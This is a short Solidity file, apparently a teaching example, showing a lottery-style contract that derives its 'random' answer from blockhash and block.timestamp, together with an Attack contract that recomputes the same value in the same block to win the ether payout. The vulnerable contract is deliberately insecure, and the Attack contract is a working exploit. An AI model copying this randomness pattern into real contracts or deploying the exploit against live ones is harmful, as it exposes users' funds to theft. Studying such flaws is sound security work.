// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// blockhash and block.timestamp are not reliable sources for randomness.

contract GuessTheRandomNumber {
    constructor() payable {}
    
    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp))
        );
        if(_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "failed to send ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}